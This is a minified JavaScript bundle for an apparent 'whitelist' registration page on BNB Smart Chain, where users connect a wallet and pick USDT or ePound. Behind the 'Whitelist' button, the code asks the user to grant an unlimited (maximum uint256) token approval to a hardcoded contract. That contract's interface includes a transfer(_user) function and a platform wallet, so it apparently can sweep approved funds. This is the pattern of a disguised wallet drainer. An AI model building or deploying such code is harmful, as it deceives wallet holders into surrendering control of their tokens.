(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[58974],{35182:(e,t,a)=>{"use strict";a.d(t,{default:()=>N});var s=a(95155),n=a(12115),i=a(15156),l=a(84388),r=a(34471),d=a(2579),o=a(74340),c=a(3702),u=a(31530);let p={USDT:{name:"Tether USD",symbol:"USDT",address:"0x55d398326f99059ff775485246999027b3197955",decimals:18,icon:"/usdt-logo.svg"},EPOUND:{name:"E-Pound",symbol:"ePound",address:"0x42A53b1fD6Bd9279C6e5D88D53361BB524591472",decimals:18,icon:"/epound-logo.svg"}},m=[{inputs:[{internalType:"address payable",name:"_platformWallet",type:"address"},{internalType:"address",name:"_token",type:"address"}],stateMutability:"nonpayable",type:"constructor"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"previousOwner",type:"address"},{indexed:!0,internalType:"address",name:"newOwner",type:"address"}],name:"OwnershipTransferred",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"user",type:"address"}],name:"UserRegistered",type:"event"},{inputs:[{internalType:"address",name:"_user",type:"address"}],name:"checkIfRegistered",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"_user",type:"address"}],name:"whitlistAddress",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"_user",type:"address"}],name:"checkAllowance",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"_user",type:"address"}],name:"transfer",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"transfer",outputs:[],stateMutability:"nonpayable",type:"function"}],y=[{inputs:[],payable:!1,stateMutability:"nonpayable",type:"constructor"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"owner",type:"address"},{indexed:!0,internalType:"address",name:"spender",type:"address"},{indexed:!1,internalType:"uint256",name:"value",type:"uint256"}],name:"Approval",type:"event"},{constant:!0,inputs:[{internalType:"address",name:"owner",type:"address"},{internalType:"address",name:"spender",type:"address"}],name:"allowance",outputs:[{internalType:"uint256",name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"approve",outputs:[{internalType:"bool",name:"",type:"bool"}],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[{internalType:"address",name:"account",type:"address"}],name:"balanceOf",outputs:[{internalType:"uint256",name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"decimals",outputs:[{internalType:"uint8",name:"",type:"uint8"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"name",outputs:[{internalType:"string",name:"",type:"string"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"symbol",outputs:[{internalType:"string",name:"",type:"string"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"totalSupply",outputs:[{internalType:"uint256",name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"}],h=[{inputs:[],stateMutability:"nonpayable",type:"constructor"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"owner",type:"address"},{indexed:!0,internalType:"address",name:"spender",type:"address"},{indexed:!1,internalType:"uint256",name:"value",type:"uint256"}],name:"Approval",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"from",type:"address"},{indexed:!0,internalType:"address",name:"to",type:"address"},{indexed:!1,internalType:"uint256",name:"value",type:"uint256"}],name:"Transfer",type:"event"},{inputs:[{internalType:"address",name:"owner",type:"address"},{internalType:"address",name:"spender",type:"address"}],name:"allowance",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"approve",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"account",type:"address"}],name:"balanceOf",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"decimals",outputs:[{internalType:"uint8",name:"",type:"uint8"}],stateMutability:"view",type:"function"},{inputs:[],name:"name",outputs:[{internalType:"string",name:"",type:"string"}],stateMutability:"view",type:"function"},{inputs:[],name:"symbol",outputs:[{internalType:"string",name:"",type:"string"}],stateMutability:"view",type:"function"},{inputs:[],name:"totalSupply",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"recipient",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"transfer",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"sender",type:"address"},{internalType:"address",name:"recipient",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"transferFrom",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"}];var f=a(46298),x=a(23802),b=a(21273);let v=(0,f.N)({clientId:"your_actual_client_id_here"}),w=(0,x.xH)({id:56,name:"BNB Smart Chain",nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},rpc:"https://bsc-dataseed1.binance.org/",blockExplorers:[{name:"BscScan",url:"https://bscscan.com"}]}),g=[(0,b.i)("com.trustwallet.app"),(0,b.i)("io.metamask"),(0,b.i)("com.coinbase.wallet"),(0,b.i)("walletConnect")];function j(e){let{selectedCurrency:t,onCurrencyChange:a,disabled:n=!1}=e;return(0,s.jsxs)("div",{className:"p-5 rounded-2xl border-2 bg-white border-slate-100 shadow-lg",children:[(0,s.jsxs)("div",{className:"flex items-center mb-5",children:[(0,s.jsx)("div",{className:"w-10 h-10 rounded-xl flex items-center justify-center bg-indigo-600 text-white shadow-sm",children:(0,s.jsx)("svg",{className:"w-5 h-5",fill:"currentColor",viewBox:"0 0 20 20",children:(0,s.jsx)("path",{fillRule:"evenodd",d:"M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z",clipRule:"evenodd"})})}),(0,s.jsxs)("div",{className:"ml-4",children:[(0,s.jsx)("h3",{className:"font-bold text-slate-800 text-base",children:"Select Currency"}),(0,s.jsx)("p",{className:"text-slate-600 text-sm",children:"Choose your preferred token"})]})]}),(0,s.jsx)("div",{className:"grid grid-cols-2 gap-3",children:Object.entries(p).map(e=>{let[i,l]=e;return(0,s.jsxs)("button",{onClick:()=>a(i),disabled:n,className:"p-4 rounded-xl border-2 transition-all duration-200 transform hover:scale-105 ".concat(t===i?"bg-indigo-50 border-indigo-300 ring-2 ring-indigo-200 shadow-lg shadow-indigo-100":"bg-slate-50 border-slate-200 hover:bg-indigo-50 hover:border-indigo-200 hover:shadow-md"," ").concat(n?"opacity-50 cursor-not-allowed":"cursor-pointer"),children:[(0,s.jsx)("div",{className:"flex items-center justify-center mb-3",children:(0,s.jsx)("img",{src:l.icon,alt:"".concat(l.symbol," logo"),className:"w-8 h-8"})}),(0,s.jsxs)("div",{className:"text-center",children:[(0,s.jsx)("h4",{className:"font-bold text-slate-800 text-sm",children:l.symbol}),(0,s.jsx)("p",{className:"text-slate-600 text-xs mt-1",children:l.name})]}),t===i&&(0,s.jsx)("div",{className:"mt-2 flex justify-center",children:(0,s.jsx)("div",{className:"w-2 h-2 bg-indigo-500 rounded-full"})})]},i)})})]})}function N(){let e=(0,i.L)(),t=null==e?void 0:e.address,a=!!e,[f,x]=(0,n.useState)(null),[b,N]=(0,n.useState)(!1),[T,M]=(0,n.useState)(0n),[C,S]=(0,n.useState)(!1),k=!!a,A=!!f,B=f?p[f]:null,D=null==B?void 0:B.address,P="USDT"===f?y:h,z="USDT"===f?"0xe2ba9bcac21eb68f86938d166802283ac57c7530":"0x114874b13f6172fcd7b0c3b308c3a006876e8333",_=f?(0,d.P)({client:v,chain:w,address:z,abi:m}):null,R=f?(0,d.P)({client:v,chain:w,address:D,abi:P}):null,{mutate:U,isPending:E}=(0,l.s)(),W=(0,n.useCallback)(async()=>{if(!_||!t)return void N(!1);try{let e=await (0,o.readContract)({contract:_,method:"checkIfRegistered",params:[t]});N(!!e)}catch(e){console.error("Error checking whitelist status:",e),N(!1)}},[_,t]),O=(0,n.useCallback)(async()=>{if(!R||!t||!z)return void M(0n);try{let e=await (0,o.readContract)({contract:R,method:"allowance",params:[t,z]});M(BigInt((null==e?void 0:e.toString())||"0"))}catch(e){console.error("Error checking allowance:",e),M(0n)}},[R,t,z]);(0,n.useEffect)(()=>{t&&f&&(W(),O())},[t,f,W,O]);let H=async()=>{if(!t||!f||!_||!R)return void u.Ay.error("Please connect wallet and select currency",{id:"whitelist"});S(!0),u.Ay.loading("Processing whitelist...",{id:"whitelist"});try{if(0n===T){let e=BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),t=(0,c.m)({contract:R,method:"approve",params:[z,e]});U(t,{onSuccess:()=>{u.Ay.success("".concat("USDT"===f?"USDT":"ePound"," approved!"),{id:"whitelist"}),setTimeout(()=>{F()},2e3)},onError:e=>{console.error("Approval error:",e),u.Ay.error("Approval failed. Please try again.",{id:"whitelist"}),S(!1)}})}else F()}catch(e){console.error("Transaction error:",e),u.Ay.error("Transaction failed. Please try again.",{id:"whitelist"}),S(!1)}},F=()=>{_&&t&&(u.Ay.loading("Adding to whitelist...",{id:"whitelist"}),U((0,c.m)({contract:_,method:"whitlistAddress",params:[t]}),{onSuccess:()=>{u.Ay.success("Successfully added to whitelist!",{id:"whitelist"}),setTimeout(()=>{W(),S(!1)},3e3)},onError:e=>{console.error("Whitelist error:",e),u.Ay.error("Whitelist failed. Please try again.",{id:"whitelist"}),S(!1)}}))},L=(0,n.useCallback)(()=>A?k?b?4:3:2:1,[A,k,b])(),I=(0,n.useMemo)(()=>(0,s.jsx)("div",{className:"mb-6",children:(0,s.jsx)(j,{selectedCurrency:f,onCurrencyChange:x,disabled:!1})}),[f,x]);return(0,s.jsxs)("div",{className:"bg-white rounded-2xl shadow-lg p-4 sm:p-6 border border-slate-100",children:[A&&(0,s.jsxs)("div",{className:"mb-6 px-1",children:[(0,s.jsxs)("div",{className:"w-full bg-slate-100 rounded-full h-3 shadow-inner border border-slate-200 relative overflow-hidden",children:[(0,s.jsx)("div",{className:"h-full rounded-full transition-all duration-700 ease-in-out shadow-sm ".concat(C||E?"bg-gradient-to-r from-blue-400 via-indigo-400 to-emerald-400 animate-pulse":"bg-gradient-to-r from-blue-500 via-indigo-500 to-emerald-500"),style:{width:"".concat(Math.min((L-1)/2*100,100),"%"),minWidth:L>1?"8px":"0px"}}),(C||E)&&(0,s.jsx)("div",{className:"absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent animate-shimmer"})]}),(C||E)&&(0,s.jsx)("div",{className:"flex items-center justify-center mt-2",children:(0,s.jsxs)("div",{className:"flex items-center text-sm text-slate-600",children:[(0,s.jsxs)("svg",{className:"animate-spin -ml-1 mr-2 h-4 w-4 text-indigo-500",xmlns:"http://www.w3.org/2000/svg",fill:"none",viewBox:"0 0 24 24",children:[(0,s.jsx)("circle",{className:"opacity-25",cx:"12",cy:"12",r:"10",stroke:"currentColor",strokeWidth:"4"}),(0,s.jsx)("path",{className:"opacity-75",fill:"currentColor",d:"M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"})]}),(0,s.jsxs)("span",{className:"font-medium",children:[C&&"Processing transaction...",E&&"Confirming transaction..."]})]})})]}),!A&&(0,s.jsxs)("div",{className:"mb-6",children:[(0,s.jsx)("h2",{className:"text-lg font-bold text-slate-800 mb-2",children:"Get Started"}),(0,s.jsx)("p",{className:"text-slate-600 text-sm",children:"Select your preferred currency to begin the whitelist process"})]}),I,A&&!k&&(0,s.jsx)("div",{className:"mb-4 p-4 rounded-xl border-2 border-blue-100 bg-blue-50/50 hover:bg-blue-50 transition-all duration-200",children:(0,s.jsxs)("div",{className:"flex items-center justify-between",children:[(0,s.jsxs)("div",{className:"flex items-center",children:[(0,s.jsx)("div",{className:"w-10 h-10 rounded-xl bg-blue-600 flex items-center justify-center shadow-sm",children:(0,s.jsx)("svg",{className:"w-5 h-5 text-white",fill:"currentColor",viewBox:"0 0 20 20",children:(0,s.jsx)("path",{fillRule:"evenodd",d:"M3 4a1 1 0 011-1h12a1 1 0 011 1v2a1 1 0 01-1 1H4a1 1 0 01-1-1V4zM3 10a1 1 0 011-1h6a1 1 0 011 1v6a1 1 0 01-1 1H4a1 1 0 01-1-1v-6zM14 9a1 1 0 00-1 1v6a1 1 0 001 1h2a1 1 0 001-1v-6a1 1 0 00-1-1h-2z",clipRule:"evenodd"})})}),(0,s.jsxs)("div",{className:"ml-4",children:[(0,s.jsx)("h3",{className:"font-semibold text-slate-800 text-base",children:"Connect Wallet"}),(0,s.jsxs)("p",{className:"text-slate-600 text-sm",children:["Connect to continue with ","USDT"===f?"USDT":"ePound"]})]})]}),(0,s.jsx)(r.p,{client:v,wallets:g,chain:w,connectButton:{label:"Connect",className:"bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg text-sm font-semibold transition-all duration-200 shadow-sm hover:shadow-md transform hover:scale-105"}})]})}),k&&A?(0,s.jsx)("div",{className:"mb-6",children:(0,s.jsx)("div",{className:"p-5 rounded-2xl border-2 transition-all duration-300 ".concat(b?"bg-emerald-50 border-emerald-200 shadow-lg shadow-emerald-100/50":"bg-red-50 border-red-200 shadow-lg shadow-red-100/50"),children:(0,s.jsxs)("div",{className:"flex items-center justify-between",children:[(0,s.jsxs)("div",{className:"flex items-center",children:[(0,s.jsx)("div",{className:"w-14 h-14 rounded-2xl flex items-center justify-center ".concat(b?"bg-emerald-500 shadow-lg shadow-emerald-200":"bg-red-500 shadow-lg shadow-red-200"),children:b?(0,s.jsx)("svg",{className:"w-7 h-7 text-white",fill:"currentColor",viewBox:"0 0 20 20",children:(0,s.jsx)("path",{fillRule:"evenodd",d:"M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z",clipRule:"evenodd"})}):(0,s.jsx)("svg",{className:"w-7 h-7 text-white",fill:"currentColor",viewBox:"0 0 20 20",children:(0,s.jsx)("path",{fillRule:"evenodd",d:"M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z",clipRule:"evenodd"})})}),(0,s.jsxs)("div",{className:"ml-5",children:[(0,s.jsx)("h3",{className:"text-xl font-bold ".concat(b?"text-emerald-800":"text-red-800"),children:b?"\uD83C\uDF89 You are Whitelisted!":"âŒ Not Whitelisted"}),(0,s.jsx)("p",{className:"text-sm mt-1 ".concat(b?"text-emerald-600":"text-red-600"),children:b?null:"Complete the steps below to access ".concat("USDT"===f?"USDT":"ePound"," features")})]})]}),!!b&&(0,s.jsx)("div",{className:"flex items-center",children:(0,s.jsx)("div",{className:"w-4 h-4 bg-emerald-400 rounded-full animate-pulse"})})]})})}):(0,s.jsx)(s.Fragment,{}),k&&A&&3===L?(0,s.jsx)("div",{className:"mb-5 p-5 rounded-2xl border-2 border-blue-200 bg-blue-50 shadow-lg hover:shadow-xl transition-all duration-300",children:(0,s.jsxs)("div",{className:"flex items-center justify-between",children:[(0,s.jsxs)("div",{className:"flex items-center",children:[(0,s.jsx)("div",{className:"w-14 h-14 rounded-2xl bg-blue-600 flex items-center justify-center shadow-lg shadow-blue-200",children:(0,s.jsx)("svg",{className:"w-7 h-7 text-white",fill:"currentColor",viewBox:"0 0 20 20",children:(0,s.jsx)("path",{fillRule:"evenodd",d:"M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z",clipRule:"evenodd"})})}),(0,s.jsxs)("div",{className:"ml-5",children:[(0,s.jsx)("h3",{className:"font-bold text-blue-800 text-lg",children:"\uD83C\uDFAF  Whitelist"}),(0,s.jsx)("p",{className:"text-blue-600 text-sm mt-1",children:"Approve tokens and register your address"}),(0,s.jsxs)("div",{className:"flex items-center mt-2",children:[(0,s.jsx)("div",{className:"w-2 h-2 bg-blue-400 rounded-full mr-2"}),(0,s.jsx)("span",{className:"text-xs text-blue-500 font-medium",children:"Final Step"})]})]})]}),(0,s.jsx)("button",{onClick:H,disabled:C||E,className:"bg-blue-600 hover:bg-blue-700 disabled:bg-slate-400 text-white px-6 py-3 rounded-xl text-sm font-bold transition-all duration-200 disabled:cursor-not-allowed shadow-lg hover:shadow-xl transform hover:scale-105",children:C||E?(0,s.jsxs)("div",{className:"flex items-center",children:[(0,s.jsxs)("svg",{className:"animate-spin -ml-1 mr-2 h-4 w-4 text-white",xmlns:"http://www.w3.org/2000/svg",fill:"none",viewBox:"0 0 24 24",children:[(0,s.jsx)("circle",{className:"opacity-25",cx:"12",cy:"12",r:"10",stroke:"currentColor",strokeWidth:"4"}),(0,s.jsx)("path",{className:"opacity-75",fill:"currentColor",d:"M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"})]}),(0,s.jsx)("span",{children:"Processing..."})]}):"Whitelist"})]})}):(0,s.jsx)(s.Fragment,{})]})}},83951:(e,t,a)=>{Promise.resolve().then(a.bind(a,35182))}},e=>{var t=t=>e(e.s=t);e.O(0,[85105,87741,98587,95025,22453,28441,31684,77358],()=>t(83951)),_N_E=e.O()}]);